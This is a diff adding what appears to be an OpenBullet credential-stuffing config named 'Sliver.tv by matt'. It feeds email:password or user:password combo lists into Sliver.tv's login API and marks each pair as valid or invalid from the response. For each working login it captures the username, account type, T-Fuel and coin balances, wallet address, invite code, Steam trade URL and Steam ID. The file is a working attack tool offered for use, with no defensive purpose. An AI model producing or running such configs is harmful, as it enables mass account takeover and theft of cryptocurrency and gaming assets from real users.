@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "Sliver.tv by matt",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-24T15:25:35.7017122+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://api.sliver.tv/v1/user/auth" 
+  CONTENT "{\"email_or_username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.sliver.tv" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 63" 
+  HEADER "Origin: https://www.sliver.tv" 
+  HEADER "X-App-Version: 4" 
+  HEADER "X-Platform: web" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://www.sliver.tv/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: cs-CZ,cs;q=0.9" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "email" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login credentials." 
+
+#UserID PARSE "<SOURCE>" LR ",\"id\":\"" "\",\"" -> VAR "USERID" 
+
+#Username PARSE "<SOURCE>" LR "\",\"username\":\"" "\",\"" -> CAP "Username" 
+
+#AccountType PARSE "<SOURCE>" LR "\",\"type\":\"" "\",\"" -> CAP "Account Type" 
+
+FUNCTION ToUppercase "<Account Type>" -> CAP "Account Type" 
+
+#T-Fuel PARSE "<SOURCE>" LR "tfuel\":\"" "\",\"" -> CAP "T-Fuel" 
+
+#Coins PARSE "<SOURCE>" LR "\"coins\":" "}}" -> CAP "Coins" 
+
+#Wallet PARSE "<SOURCE>" LR ",\"wallet_address\":\"" "\",\"" -> CAP "Wallet" 
+
+#InviteCode PARSE "<SOURCE>" LR "invite_code\":\"" "\",\"" -> CAP "Invite Code" 
+
+#Trade_Url PARSE "<SOURCE>" LR "steam_trade_url\":\"" "&token" -> CAP "Trade Url" 
+
+#Steam_ID PARSE "<SOURCE>" LR ",\"steam_id\":\"" "\",\"" -> CAP "Steam ID" 
+
